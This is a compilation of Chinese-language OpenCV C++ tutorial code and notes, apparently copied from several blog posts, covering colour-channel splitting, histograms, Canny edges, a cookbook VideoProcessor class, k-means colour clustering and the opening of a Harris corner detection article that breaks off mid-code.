	vector<Mat> b,g,r;   //用来表示的彩色图像

	for(int i=0;i<3;i++)
	{
		if(i==0)
			b.push_back(bgr[0]);
		else
			b.push_back(tmp);

		if(i==1)
			g.push_back(bgr[1]);
		else
			g.push_back(tmp);

		if(i==2)
			r.push_back(bgr[2]);
		else
			r.push_back(tmp);
	}
	Mat image_b,image_g,image_r;
	
	merge(b,image_b);
	merge(g,image_g);
	merge(r,image_r);

	namedWindow( "b", CV_WINDOW_AUTOSIZE );
	namedWindow( "g", CV_WINDOW_AUTOSIZE );
	namedWindow( "r", CV_WINDOW_AUTOSIZE );
	namedWindow( "dst", CV_WINDOW_AUTOSIZE );
	imshow("b",image_b);
	
	imshow("g",image_g);
	
	imshow("r",image_r);
	
	imshow("dst",image_dst);
	moveWindow("dst", 1,1);
	moveWindow("b",800,1);
	moveWindow("g",1,500);
	moveWindow("r",900,500);

	//waitKey(1);
	//waitKey(0);
	

}

void split_image_gray(const char* image_name)
{
	Mat image_src = imread(image_name);
	Mat image_dst;
	vector<Mat> bgr;

	//颜色通道分离
	//输入图像
	//分离后各通道
	split(image_src,bgr);

	//颜色通道合成
	//输入各通道
	//输入图像

	imshow("B_channel",bgr[0]);
	imshow("G_channel",bgr[1]);
	imshow("R_channel",bgr[2]);
	//waitKey(1);

}

//计算和绘制直方图（R,G,B）
/* img 通道图像
 * hist_img: 直方图的绘图图像
 * pstrWndName: 绘图窗口
 */
void draw_histogram(IplImage* img,IplImage* hist_img,const char* pstrWndName)
{

	CvHistogram* hist = NULL;

	int bin_count = 256;
	float range[] = {0,255};
	float* ranges[]={range};

	hist = cvCreateHist(1,         //一维
		&bin_count, //每一维上bin（直方柱）的个数， 此处为 256 【由上述两个参数，函数/就会创建一个1*256的矩阵】
		CV_HIST_ARRAY,
		ranges,
		1);
	cvClearHist(hist);   //防止初始化时有其它数据，先清理一下	

	cvCalcHist(&img,hist,0,0);

	//得到直方图的最值及标号
	float min,max;
	int min_idx,max_idx;
	cvGetMinMaxHistValue(hist,&min,&max,&min_idx,&max_idx);

	//cout<<"min: "<<min<<"  max:"<<max<<endl; 
	if(max == 0) {cout<<"max =0 err!"<<endl;max = 100;}

	//缩放直方图的大小，和图像相适应
	cvScale(hist->bins,hist->bins,((double)hist_img->height)/max,0);

	//设置所有的直方图的数值为255
	cvSet(hist_img,cvScalarAll(255),0);

	// 平均每个直放柱的宽度
	int bin_w=cvRound((double)hist_img->width/bin_count);

	//画直方图
	for(int i=0;i<bin_count;i++)
	{
	   cvRectangle(hist_img,
		cvPoint(i*bin_w,hist_img->height),  //左下角的点（i*bin_w，height）
		cvPoint((i+1)*bin_w, hist_img->height-cvRound(cvGetReal1D(hist->bins,i))),//右上角的点((i+1)*bin_w,图像高度-直方柱的高度)
		 cvScalarAll(0),
		-1,
		8,
		0);
	}

	//显示直方图
	cvShowImage(pstrWndName,hist_img);
	cvWaitKey(1);
}

void historgram_channel(const char* image_name)
{
	IplImage* image_src = cvLoadImage(image_name,1);

	//创建窗口
	const char* pstrBHistWnd = "b plane";
	const char* pstrGHistWnd = "g plane";
	const char* pstrRHistWnd = "r plane";
	cvNamedWindow(pstrBHistWnd,1);
	cvNamedWindow(pstrGHistWnd,1);
	cvNamedWindow(pstrRHistWnd,1);

	//B G R 通道
	CvSize img_size;img_size.width = image_src->width;img_size.height = image_src->height;
	IplImage* b = cvCreateImage(img_size,8,1);
	IplImage* g = cvCreateImage(img_size,8,1);
	IplImage* r = cvCreateImage(img_size,8,1);
	//分割BGR通道
	cvSplit(image_src,b,g,r,0);

	CvSize size;size.width = image_src->width;size.height = image_src->height;
	IplImage* b_hist_img = cvCreateImage(size,8,1);
	IplImage* g_hist_img = cvCreateImage(size,8,1);
	IplImage* r_hist_img = cvCreateImage(size,8,1);

	//绘制直方图
	draw_histogram(b,b_hist_img,pstrBHistWnd); 
	draw_histogram(g,g_hist_img,pstrGHistWnd); 
	draw_histogram(r,r_hist_img,pstrRHistWnd); 
	


}

int _tmain(int argc, _TCHAR* argv[])
{
	char* image_name = "swan.jpg";
	split_image(image_name);
	split_image_gray(image_name);
	historgram_channel(image_name);

	waitKey(0);

	

	getchar();
	return 0;
}



 
 
 
实现效果：
 
 
 
 
彩色直方图：
#include <cv.h>
#include <highgui.h>
#include <iostream>
using namespace std;
 
 
 
int main( int argc, char** argv )
{
	IplImage * src= cvLoadImage("F:\\test3.jpg");
 
	IplImage* hsv = cvCreateImage( cvGetSize(src), 8, 3 );
	IplImage* h_plane = cvCreateImage( cvGetSize(src), 8, 1 );
	IplImage* s_plane = cvCreateImage( cvGetSize(src), 8, 1 );
	IplImage* v_plane = cvCreateImage( cvGetSize(src), 8, 1 );
	IplImage* planes[] = { h_plane, s_plane };
 
	/** H 分量划分为16个等级，S分量划分为8个等级 */
	int h_bins = 16, s_bins = 8;
	int hist_size[] = {h_bins, s_bins};
 
	/** H 分量的变化范围 */
	float h_ranges[] = { 0, 180 }; 
 
	/** S 分量的变化范围*/
	float s_ranges[] = { 0, 255 };
	float* ranges[] = { h_ranges, s_ranges };
 
	/** 输入图像转换到HSV颜色空间 */
	cvCvtColor( src, hsv, CV_BGR2HSV );
	cvCvtPixToPlane( hsv, h_plane, s_plane, v_plane, 0 );
 
	/** 创建直方图，二维, 每个维度上均分 */
	CvHistogram * hist = cvCreateHist( 2, hist_size, CV_HIST_ARRAY, ranges, 1 );
	/** 根据H,S两个平面数据统计直方图 */
	cvCalcHist( planes, hist, 0, 0 );
 
	/** 获取直方图统计的最大值，用于动态显示直方图 */
	float max_value;
	cvGetMinMaxHistValue( hist, 0, &max_value, 0, 0 );
 
 
	/** 设置直方图显示图像 */
	int height = 240;
	int width = (h_bins*s_bins*6);
	IplImage* hist_img = cvCreateImage( cvSize(width,height), 8, 3 );
	cvZero( hist_img );
 
	/** 用来进行HSV到RGB颜色转换的临时单位图像 */
	IplImage * hsv_color = cvCreateImage(cvSize(1,1),8,3);
	IplImage * rgb_color = cvCreateImage(cvSize(1,1),8,3);
	int bin_w = width / (h_bins * s_bins);
	for(int h = 0; h < h_bins; h++)
	{
		for(int s = 0; s < s_bins; s++)
		{
			int i = h*s_bins + s;
			/** 获得直方图中的统计次数，计算显示在图像中的高度 */
			float bin_val = cvQueryHistValue_2D( hist, h, s );
			int intensity = cvRound(bin_val*height/max_value);
 
			/** 获得当前直方图代表的颜色，转换成RGB用于绘制 */
			cvSet2D(hsv_color,0,0,cvScalar(h*180.f / h_bins,s*255.f/s_bins,255,0));
			cvCvtColor(hsv_color,rgb_color,CV_HSV2BGR);
			CvScalar color = cvGet2D(rgb_color,0,0);
 
			cvRectangle( hist_img, cvPoint(i*bin_w,height),
				cvPoint((i+1)*bin_w,height - intensity),
				color, -1, 8, 0 );
		}
	}
 
	cvNamedWindow( "Source", 1 );
	cvShowImage( "Source", src );
 
	cvNamedWindow( "H-S Histogram", 1 );
	cvShowImage( "H-S Histogram", hist_img );
 
	cvWaitKey(0);
}


 
输入图像：
 

 
输出直方图：
 
 







 
文献链接：
http://www.cnblogs.com/tornadomeet/archive/2012/12/26/2834336.html
 
下面这个高手，写了个小程序我还没有调试，回头 调试看看
http://blog.csdn.net/u013097499/article/details/30017739
 
代码：
 
// writePng.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>



#include <opencv2/highgui/highgui.hpp>
#include <opencv2/core/core.hpp>

#pragma comment(lib, "opencv_highgui2410d.lib")
#pragma comment(lib, "opencv_core2410d.lib")

using namespace cv;
using namespace std;





Mat src;
Mat image;
string str = "./";

/*创建alpha表，整体偏红色，左上角到右下角呈现从完全透明到完全不透明变化趋势*/
void createAlphaMat(Mat &mat)
{
	for (int i = 0; i < mat.rows; ++i) 
	{
		for (int j = 0; j < mat.cols; ++j) 
		{
			Vec4b& rgba = mat.at<Vec4b>(i, j);
			rgba[0] = UCHAR_MAX;    //r分量一直最大，所以整体偏红
			rgba[1] = saturate_cast<uchar>((float (mat.cols - j)) / ((float)mat.cols) * UCHAR_MAX);
			rgba[2] = saturate_cast<uchar>((float (mat.rows - i)) / ((float)mat.rows) * UCHAR_MAX);
			rgba[3] = saturate_cast<uchar>(0.5 * (rgba[1] + rgba[2]));
		}
	}
}

int run_test_png()
{
	

	/*采用自己设置的参数来保存图片*/
	Mat mat(480, 640, CV_8UC4);
	createAlphaMat(mat);
	vector<int> compression_params;
	compression_params.push_back(CV_IMWRITE_PNG_COMPRESSION);
	compression_params.push_back(9);    //png格式下，默认的参数为3.
	try 
	{
		imwrite("alpha.png", mat, compression_params);
	}
	catch (runtime_error& ex) 
	{
		fprintf(stderr, "Exception converting image to PNG format: %s\n", ex.what());
		return 1;
	}
	fprintf(stdout, "Saved PNG file with alpha data.\n");

	waitKey(0);
	return 0;
}

int main()
{
	cv::Mat image = cv::imread("swan.jpg");
	cv::Mat logo = cv::imread("swan.jpg");
	cv::Mat mask = cv::imread("swan.jpg",0);

	Mat temp = image.clone();
	Rect rect(image.cols/4, image.rows/4, image.cols/2, image.rows/2);
	Mat small_image = temp(rect);

	imshow("image", small_image);//截取图像，并显示


	cv::Mat imageROI;

	imageROI =  image(cv::Rect(10,10,200,100));
	imshow("imageroi", imageROI);//截取图像，并显示

	logo.copyTo(imageROI,mask);
	cv::namedWindow("result");
	cv::imshow("result",imageROI);

	run_test_png();
	cv::waitKey();


	return 0;
}

 
 
 

 
 
保存起来的图片，可见opencv对于png格式的图片显示还是需要加强的，我想应该有些手段可以显示出来
 







// Basic_OpenCV_2.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include "cv.h"
#include "highgui.h"

using namespace std;

void SmoothImage(IplImage* image)//平滑函数
{
	cvNamedWindow("Smooth_in");
	cvNamedWindow("Smooth_out");
	cvShowImage("Smooth_in",image);

	IplImage* out = cvCreateImage(cvGetSize(image),IPL_DEPTH_8U,3);
	cvSmooth(image,out,CV_BLUR,32,32);//平滑函数,后面两个参数是窗口大小
	cvShowImage("Smooth_out",out);

	cvReleaseImage(&out);

	cvWaitKey(0);
	cvDestroyAllWindows();
}

void doPyrDown(IplImage* in, int filter = IPL_GAUSSIAN_5x5)//图像缩小为一半
{
	//Best to make sure input image is divisible by two.
	assert(in->width%2 == 0 && in->height%2 == 0);
	IplImage* out = cvCreateImage(cvSize(in->width/2 , in->height/2) , in->depth , in->nChannels);
	cvPyrDown(in , out);

	cvNamedWindow("PyrDown_out");
	cvShowImage("PyrDown_out",out);
	cvReleaseImage(&out);

	cvWaitKey(0);
	cvDestroyAllWindows();
	//return out;


}

void doCanny(IplImage* in , double lowThresh , double highThresh , double aperture)
{
	IplImage* out = cvCreateImage(cvSize(in->width,in->height) , IPL_DEPTH_8U , 1);
	if(in->nChannels != 1)
	{
		//cout<<"error! unsupported format or combination of formats() in unknown function"<<endl;
		//return;//canny only handles gray scale image

		//若不是灰度图，直接转化成灰度图
		IplImage* gray =  cvCreateImage(cvGetSize(in), IPL_DEPTH_8U, 1);  
	    cvCvtColor(in, gray, CV_BGR2GRAY);
		out = gray;
	}
		

	cvCanny(in , out , lowThresh , highThresh , aperture );

	cvNamedWindow("Canny_out");
	cvShowImage("Canny_out",out);
	cvReleaseImage(&out);

	cvWaitKey(0);
	cvDestroyAllWindows();


}

int _tmain(int argc, _TCHAR* argv[])
{
	IplImage* image = cvLoadImage("lena.jpg");
	//SmoothImage(image);
	//doPyrDown(image);
	doCanny(image ,10 , 100 , 3 );



	system("pause");
	return 0;
}



 






 
代码出处，opencv2 cookbook：
/*------------------------------------------------------------------------------------------*\
   This file contains material supporting chapter 10 of the cookbook:  
   Computer Vision Programming using the OpenCV Library. 
   by Robert Laganiere, Packt Publishing, 2011.

   This program is free software; permission is hereby granted to use, copy, modify, 
   and distribute this source code, or portions thereof, for any purpose, without fee, 
   subject to the restriction that the copyright notice may not be removed 
   or altered from any source or altered source distribution. 
   The software is released on an as-is basis and without any warranties of any kind. 
   In particular, the software is not guaranteed to be fault-tolerant or free from failure. 
   The author disclaims all warranties with regard to this software, any use, 
   and any consequent failure, is purely the responsibility of the user.
 
   Copyright (C) 2010-2011 Robert Laganiere, www.laganiere.name
\*------------------------------------------------------------------------------------------*/

#if !defined VPROCESSOR
#define VPROCESSOR

#include <iostream>
#include <iomanip>
#include <sstream>
#include <string>
#include <vector>
#include <opencv2/core/core.hpp>
#include <opencv2/highgui/highgui.hpp>

#include <iostream>
#include <opencv2/core/core.hpp>
#include <opencv2/imgproc/imgproc.hpp>
#include <opencv2/highgui/highgui.hpp>




#pragma comment(lib,"opencv_core2410d.lib")  
#pragma comment(lib,"opencv_highgui2410d.lib")  
#pragma comment(lib,"opencv_imgproc2410d.lib")  



// The frame processor interface
class FrameProcessor {

  public:
	// processing method
	virtual void process(cv:: Mat &input, cv:: Mat &output)= 0;
};

class VideoProcessor {

  private:

	  // the OpenCV video capture object
	  cv::VideoCapture capture;
	  // the callback function to be called 
	  // for the processing of each frame
	  void (*process)(cv::Mat&, cv::Mat&);
	  // the pointer to the class implementing 
	  // the FrameProcessor interface
	  FrameProcessor *frameProcessor;
	  // a bool to determine if the 
	  // process callback will be called .是否使用回调函数的bool变量
	  bool callIt;
	  // Input display window name
	  std::string windowNameInput;
	  // Output display window name
	  std::string windowNameOutput;
	  // delay between each frame processing
	  int delay;
	  // number of processed frames 
	  long fnumber;
	  // stop at this frame number
	  long frameToStop;
	  // to stop the processing
	  bool stop;

	  // vector of image filename to be used as input
	  std::vector<std::string> images; 
	  // image vector iterator
	  std::vector<std::string>::const_iterator itImg;

	  // the OpenCV video writer object
	  cv::VideoWriter writer;
	  // output filename
	  std::string outputFile;

	  // current index for output images
	  int currentIndex;
	  // number of digits in output image filename
	  int digits;
	  // extension of output images
	  std::string extension;

	  // to get the next frame 
	  // could be: video file; camera; vector of images
	  bool readNextFrame(cv::Mat& frame)
	  {

		  if (images.size()==0)
			  return capture.read(frame);
		  else {

			  if (itImg != images.end()) 
			  {

				  frame= cv::imread(*itImg);
				  itImg++;
				  return frame.data != 0;
			  }
		  }
	  }

	  // to write the output frame 
	  // could be: video file or images
	  void writeNextFrame(cv::Mat& frame)
	  {

		  if (extension.length()) { // then we write images
		  
			  std::stringstream ss;
		      ss << outputFile << std::setfill('0') << std::setw(digits) << currentIndex++ << extension;
			  cv::imwrite(ss.str(),frame);

		  } 
		  else 
		  { // then write video file

			  writer.write(frame);
		  }
	  }

  public:

	  // Constructor setting the default values
	  VideoProcessor() : callIt(false), delay(-1), 
		  fnumber(0), stop(false), digits(0), frameToStop(-1), 
	      process(0), frameProcessor(0) {}

	  // set the name of the video file
	  bool setInput(std::string filename) {

		fnumber= 0;
		// In case a resource was already 
		// associated with the VideoCapture instance
		capture.release();
		images.clear();

		// Open the video file
		return capture.open(filename);
	  }

	  // set the camera ID
	  bool setInput(int id)
	  {

		fnumber= 0;
		// In case a resource was already 
		// associated with the VideoCapture instance
		capture.release();
		images.clear();

		// Open the video file
		return capture.open(id);
	  }

	  // set the vector of input images
	  bool setInput(const std::vector<std::string>& imgs) 
	  {

		fnumber= 0;
		// In case a resource was already 
		// associated with the VideoCapture instance
		capture.release();

		// the input will be this vector of images
		images= imgs;
		itImg= images.begin();

		return true;
	  }

	  // set the output video file
	  // by default the same parameters than input video will be used
	  bool setOutput(const std::string &filename, int codec=0, double framerate=0.0, bool isColor=true) 
	  {

		  outputFile= filename;
		  extension.clear();
		  
		  if (framerate==0.0) 
			  framerate= getFrameRate(); // same as input

		  char c[4];
		  // use same codec as input
		  if (codec==0) { 
			  codec= getCodec(c);
		  }

		  // Open output video
		  return writer.open(outputFile, // filename
			  codec, // codec to be used 
			  framerate,      // frame rate of the video
			  getFrameSize(), // frame size
			  isColor);       // color video?
	  }

	  // set the output as a series of image files
	  // extension must be ".jpg", ".bmp" ...
	  bool setOutput(const std::string &filename, // filename prefix
		  const std::string &ext, // image file extension 
		  int numberOfDigits=3,   // number of digits
		  int startIndex=0) 
		  {     // start index

		  // number of digits must be positive
		  if (numberOfDigits<0)
			  return false;

		  // filenames and their common extension
		  outputFile= filename;
		  extension= ext;

		  // number of digits in the file numbering scheme
		  digits= numberOfDigits;
		  // start numbering at this index
		  currentIndex= startIndex;

		  return true;
	  }

	  // set the callback function that will be called for each frame
	  void setFrameProcessor(void (*frameProcessingCallback)(cv::Mat&, cv::Mat&))
	  {

		  // invalidate frame processor class instance
		  frameProcessor= 0;
		  // this is the frame processor function that will be called
		  process= frameProcessingCallback;
		  callProcess();
	  }

	  // set the instance of the class that implements the FrameProcessor interface
	  void setFrameProcessor(FrameProcessor* frameProcessorPtr)
	  {

		  // invalidate callback function
		  process= 0;
		  // this is the frame processor instance that will be called
		  frameProcessor= frameProcessorPtr;
		  callProcess();
	  }

	  // stop streaming at this frame number
	  void stopAtFrameNo(long frame)
	  {

		  frameToStop= frame;
	  }

	  // process callback to be called
	  void callProcess()
	  {

		  callIt= true;
	  }

	  // do not call process callback
	  void dontCallProcess()
	  {

		  callIt= false;
	  }

	  // to display the processed frames
	  void displayInput(std::string wn)
	  {
	    
		  windowNameInput= wn;
		  cv::namedWindow(windowNameInput);
	  }

	  // to display the processed frames
	  void displayOutput(std::string wn)
	  {
	    
		  windowNameOutput= wn;
		  cv::namedWindow(windowNameOutput);
	  }

	  // do not display the processed frames
	  void dontDisplay()
	  {

		  cv::destroyWindow(windowNameInput);
		  cv::destroyWindow(windowNameOutput);
		  windowNameInput.clear();
		  windowNameOutput.clear();
	  }

	  // set a delay between each frame
	  // 0 means wait at each frame
	  // negative means no delay
	  void setDelay(int d) 
	  {
	  
		  delay= d;
	  }

	  // a count is kept of the processed frames
	  long getNumberOfProcessedFrames()
	  {
	  
		  return fnumber;
	  }

	  // return the size of the video frame
	  cv::Size getFrameSize() 
	  {

		if (images.size()==0) 
		{

			// get size of from the capture device
			int w= static_cast<int>(capture.get(CV_CAP_PROP_FRAME_WIDTH));
			int h= static_cast<int>(capture.get(CV_CAP_PROP_FRAME_HEIGHT));

			return cv::Size(w,h);

		}
		else
		{ // if input is vector of images

			cv::Mat tmp= cv::imread(images[0]);
			if (!tmp.data) return cv::Size(0,0);
			else return tmp.size();
		}
	  }

	  // return the frame number of the next frame
	  long getFrameNumber()
	  {

		if (images.size()==0) 
		{

			// get info of from the capture device
	 	    long f= static_cast<long>(capture.get(CV_CAP_PROP_POS_FRAMES));
		    return f; 

		} else { // if input is vector of images

			return static_cast<long>(itImg-images.begin());
		}
	  }

	  // return the position in ms
	  double getPositionMS()
	  {

		  // undefined for vector of images
		  if (images.size()!=0) return 0.0;

	 	  double t= capture.get(CV_CAP_PROP_POS_MSEC);
		  return t; 
	  }

	  // return the frame rate
	  double getFrameRate() 
	  {

		  // undefined for vector of images
		  if (images.size()!=0) return 0;

	 	  double r= capture.get(CV_CAP_PROP_FPS);
		  return r; 
	  }

	  // return the number of frames in video
	  long getTotalFrameCount() 
	  {

		  // for vector of images
		  if (images.size()!=0) return images.size();

	 	  long t= capture.get(CV_CAP_PROP_FRAME_COUNT);
		  return t; 
	  }

	  // get the codec of input video
	  int getCodec(char codec[4])
	  {

		  // undefined for vector of images
		  if (images.size()!=0) return -1;

		  union {
			  int value;
			  char code[4]; } returned;

		  returned.value= static_cast<int>(capture.get(CV_CAP_PROP_FOURCC));

		  codec[0]= returned.code[0];
		  codec[1]= returned.code[1];
		  codec[2]= returned.code[2];
		  codec[3]= returned.code[3];

		  return returned.value;
	  }
	  
	  // go to this frame number
	  bool setFrameNumber(long pos)
	  {

		  // for vector of images
		  if (images.size()!=0)
		  {

			  // move to position in vector
			  itImg= images.begin() + pos;
			  // is it a valid position?
			  if (pos < images.size())
				  return true;
			  else
				  return false;

		  }
		  else
		  { // if input is a capture device

			return capture.set(CV_CAP_PROP_POS_FRAMES, pos);
		  }
	  }

	  // go to this position
	  bool setPositionMS(double pos)
	  {

		  // not defined in vector of images
		  if (images.size()!=0) 
			  return false;
		  else 
		      return capture.set(CV_CAP_PROP_POS_MSEC, pos);
	  }

	  // go to this position expressed in fraction of total film length
	  bool setRelativePosition(double pos)
	  {

		  // for vector of images
		  if (images.size()!=0)
		  {

			  // move to position in vector
			  long posI= static_cast<long>(pos*images.size()+0.5);
			  itImg= images.begin() + posI;
			  // is it a valid position?
			  if (posI < images.size())
				  return true;
			  else
				  return false;

		  } 
		  else 
		  { // if input is a capture device

			  return capture.set(CV_CAP_PROP_POS_AVI_RATIO, pos);
		  }
	  }

	  // Stop the processing
	  void stopIt()
	  {

		  stop= true;
	  }

	  // Is the process stopped?
	  bool isStopped()
	  {

		  return stop;
	  }

	  // Is a capture device opened?
	  bool isOpened() 
	  {

		  return capture.isOpened() || !images.empty();
	  }
	  
	  // to grab (and process) the frames of the sequence
	  void run()
	  {

		  // current frame
		  cv::Mat frame;
		  // output frame
		  cv::Mat output;

		  // if no capture device has been set
		  if (!isOpened())
			  return;

		  stop= false;

		  while (!isStopped())
		  {

			  // read next frame if any
			  if (!readNextFrame(frame))
				  break;

			  // display input frame
			  if (windowNameInput.length()!=0) 
				  cv::imshow(windowNameInput,frame);

		      // calling the process function or method
			  if (callIt)
			  {
				  
				// process the frame
				if (process)
				    process(frame, output);
				else if (frameProcessor) 
					frameProcessor->process(frame,output);
				// increment frame number
			    fnumber++;

			  } 
			  else 
			  {

				output= frame;
			  }

			  // write output sequence
			  if (outputFile.length()!=0)
				  writeNextFrame(output);

			  // display output frame
			  if (windowNameOutput.length()!=0) 
				  cv::imshow(windowNameOutput,output);
			
			  // introduce a delay
			  if (delay>=0 && cv::waitKey(delay)>=0)
				stopIt();

			  // check if we should stop
			  if (frameToStop>=0 && getFrameNumber()==frameToStop)
				  stopIt();
		  }
	  }
};

#endif


 
 
 
 
/*------------------------------------------------------------------------------------------*\
   This file contains material supporting chapter 10 of the cookbook:  
   Computer Vision Programming using the OpenCV Library. 
   by Robert Laganiere, Packt Publishing, 2011.

   This program is free software; permission is hereby granted to use, copy, modify, 
   and distribute this source code, or portions thereof, for any purpose, without fee, 
   subject to the restriction that the copyright notice may not be removed 
   or altered from any source or altered source distribution. 
   The software is released on an as-is basis and without any warranties of any kind. 
   In particular, the software is not guaranteed to be fault-tolerant or free from failure. 
   The author disclaims all warranties with regard to this software, any use, 
   and any consequent failure, is purely the responsibility of the user.
 
   Copyright (C) 2010-2011 Robert Laganiere, www.laganiere.name
\*------------------------------------------------------------------------------------------*/


#include "videoprocessor.h"

void draw(cv::Mat& img, cv::Mat& out) 
{

	img.copyTo(out);
	cv::circle(out, cv::Point(100,100),5,cv::Scalar(255,0,0),2);
}

void canny(cv::Mat& img, cv::Mat& out) {

	// Convert to gray
	cv::cvtColor(img,out,CV_BGR2GRAY);
	// Compute Canny edges
	cv::Canny(out,out,100,200);
	// Invert the image
	cv::threshold(out,out,128,255,cv::THRESH_BINARY_INV);
}

int main()
{
	// Open the video file
    cv::VideoCapture capture("../bike.avi");
	// check if video successfully opened
	if (!capture.isOpened())
		return 1;

	// Get the frame rate
	double rate= capture.get(CV_CAP_PROP_FPS);

	bool stop(false);
	cv::Mat frame; // current video frame
	cv::namedWindow("Extracted Frame");

	// Delay between each frame
	// corresponds to video frame rate
	int delay= 1000/rate;

	// for all frames in video
	while (!stop) {

		// read next frame if any
		if (!capture.read(frame))
			break;

		cv::imshow("Extracted Frame",frame);

		// introduce a delay
		// or press key to stop
		if (cv::waitKey(delay)>=0)
				stop= true;
	}

	// Close the video file
	capture.release();

	cv::waitKey();
		
	// Now using the VideoProcessor class

	// Create instance
	VideoProcessor processor;
	// Open video file
	processor.setInput("../bike.avi");
	// Declare a window to display the video
	processor.displayInput("Input Video");
	processor.displayOutput("Output Video");
	// Play the video at the original frame rate
	processor.setDelay(1000./processor.getFrameRate());
	// Set the frame processor callback function
	processor.setFrameProcessor(canny);
	// Start the process
	processor.run();
	cv::waitKey();
	
	// Second test
	// Create instance
    //	VideoProcessor processor;
	// Open video file
	processor.setInput("../bike.avi");

	// Get basic info about video file
	cv::Size size= processor.getFrameSize();
	std::cout << size.width << " " << size.height << std::endl;
	std::cout << processor.getFrameRate() << std::endl;
	std::cout << processor.getTotalFrameCount() << std::endl;
	std::cout << processor.getFrameNumber() << std::endl;
	std::cout << processor.getPositionMS() << std::endl;

	// No processing
	processor.dontCallProcess();
	// Output filename
//	processor.setOutput("../output/bikeOut",".jpg");
	char codec[4];
	processor.setOutput("../output/bike.avi",processor.getCodec(codec),processor.getFrameRate());
	std::cout << "Codec: " << codec[0] << codec[1] << codec[2] << codec[3] << std::endl;

	// Position the stream at frame 300
    //	processor.setFrameNumber(300);
    //	processor.stopAtFrameNo(120);

	// Declare a window to display the video
	processor.displayInput("Current Frame");
	processor.displayOutput("Output Frame");

	// Play the video at the original frame rate
	processor.setDelay(1000./processor.getFrameRate());

	// Start the process
	processor.run();

	std::cout << processor.getFrameNumber() << std::endl;
	std::cout << processor.getPositionMS() << std::endl;

	cv::waitKey();
}

 
 
 
 
 






 
 
 
 
#include <cv.h>
#include <highgui.h>
#include <iostream>


#define MAX_CLUSTERS (8)

using namespace std;

int main( int argc, char **argv)
{
IplImage *imgA = cvLoadImage( "1.jpg", CV_LOAD_IMAGE_ANYDEPTH | CV_LOAD_IMAGE_ANYCOLOR);
if(imgA ==NULL)
{
cout<<"Can't Load Image ." << endl;
exit(0);
}

cvNamedWindow("window",CV_WINDOW_AUTOSIZE);
cvShowImage("window",imgA);//加载原图

unsigned long int size;
size = imgA->width * imgA->height;//取得图片大小

CvMat *clusters;//分类后的矩阵
clusters = cvCreateMat (size, 1, CV_32SC1);//32位1通道的矩阵
CvMat *points;//分类前的样例浮点矩阵
points = cvCreateMat (size, 1, CV_32FC3); //32位3通道的矩阵

unsigned long int i; 
for (i = 0; i < size; i++) 
{
points->data.fl[i*3] = (unsigned char) imgA->imageData[i*3];
points->data.fl[i*3 + 1] = (unsigned char) imgA->imageData[i*3 + 1];
points->data.fl[i*3 + 2] = (unsigned char) imgA->imageData[i*3 + 2]; 
} //得到三通道图像的数据

cvKMeans2 (points, MAX_CLUSTERS, clusters,
cvTermCriteria (CV_TERMCRIT_EPS + CV_TERMCRIT_ITER, 10, 1.0));
//拆分为8类聚合，最大迭代次数是10，精度是1.0

CvMat *color = cvCreateMat (MAX_CLUSTERS, 1, CV_32FC3);//8行1列的三通道浮点矩阵
CvMat *count = cvCreateMat (MAX_CLUSTERS, 1, CV_32SC1);//8行1列的单通道整数矩阵，用作计数
cvSetZero (color);
cvSetZero (count);

for (i = 0; i < size; i++)
{
int idx = clusters->data.i[i];
int j = ++count->data.i[idx];
color->data.fl[idx * 3 ] = color->data.fl[idx * 3 ] * (j - 1) / j + points->data.fl[i * 3 ] / j;
color->data.fl[idx * 3 + 1] = color->data.fl[idx * 3 + 1] * (j - 1) / j + points->data.fl[i * 3 + 1] / j;
color->data.fl[idx * 3 + 2] = color->data.fl[idx * 3 + 2] * (j - 1) / j + points->data.fl[i * 3 + 2] / j;
}

//把处理过的数据打回imgA
for (i = 0; i < size; i++)
{
int idx = clusters->data.i[i];
imgA->imageData[i * 3 ] = (char) color->data.fl[idx * 3 ];
imgA->imageData[i * 3 + 1] = (char) color->data.fl[idx * 3 + 1];
imgA->imageData[i * 3 + 2] = (char) color->data.fl[idx * 3 + 2];
}


cvNamedWindow("window2",CV_WINDOW_AUTOSIZE);

cvShowImage("window2",imgA);

cvWaitKey(0);

cvReleaseImage( &imgA );

cvDestroyWindow("window");
cvDestroyWindow("window2");
return 0;
}
 
 
 
 
 
 
 

作者：gnuhpc
出处：http://www.cnblogs.com/gnuhpc/






 
image算法测试iteratoralgorithmfeatures
原创文章，转载请注明出处：http://blog.csdn.net/crzy_sparrow/article/details/7391511
文章目录：
一、Harris角点检测基本理论
二、opencv代码实现
三、改进的Harris角点检测
四、FAST角点检测
五、参考文献
六、附录（资料和源码）
一、Harris角点检测基本理论（要讲清楚东西太多，附录提供文档详细说明）
1.1 简略表达：
角点：最直观的印象就是在水平、竖直两个方向上变化均较大的点，即Ix、Iy都较大  
边缘：仅在水平、或者仅在竖直方向有较大的变化量，即Ix和Iy只有其一较大  
平坦地区：在水平、竖直方向的变化量均较小，即Ix、Iy都较小

角点响应
R=det(M)-k*(trace(M)^2)   (附录资料给出k=0.04~0.06，opencv指出是0.05-0.5，浮动较大)
det(M)=λ1*λ2      trace(M)=λ1+λ2
R取决于M的特征值，对于角点|R|很大，平坦的区域|R|很小，边缘的R为负值。
1.2 详细描述：见附录里的ppt
1.3 算法步骤


其中，局部极大值可用先膨胀后与原图比较的方法求得，具体见二中源码。
二、opencv代码实现
harris类
#ifndef HARRIS_H
#define HARRIS_H
#include "opencv2/opencv.hpp"

class harris
{
private:
    cv::Mat  cornerStrength;  //opencv harris函数检测结果，也就是每个像素的角点响应函数值
    cv::Mat cornerTh; //cornerStrength阈值化的结果
    cv::Mat localMax; //局部最大值结果
    int neighbourhood; //邻域窗口大小
    int aperture;//sobel边缘检测窗口大小（sobel获取各像素点x，y方向的灰度导数）
    double k;
    double maxStrength;//角点响应函数最大值
    double threshold;//阈值除去响应小的值
    int nonMaxSize;//这里采用默认的3，就是最大值抑制的邻域窗口大小
    cv::Mat kernel;//最大值抑制的核，这里也就是膨胀用到的核
public:
    harris():neighbourhood(3),aperture(3),k(0.01),maxStrength(0.0),threshold(0.01),nonMaxSize(3){

    };

    void setLocalMaxWindowsize(int nonMaxSize){
        this->nonMaxSize = nonMaxSize;
    };

    //计算角点响应函数以及非最大值抑制
    void detect(const cv::Mat &image){
            //opencv自带的角点响应函数计算函数
            cv::cornerHarris (image,cornerStrength,neighbourhood,aperture,k);
            double minStrength;
            //计算最大最小响应值
            cv::minMaxLoc (cornerStrength,&minStrength,&maxStrength);

            cv::Mat dilated;
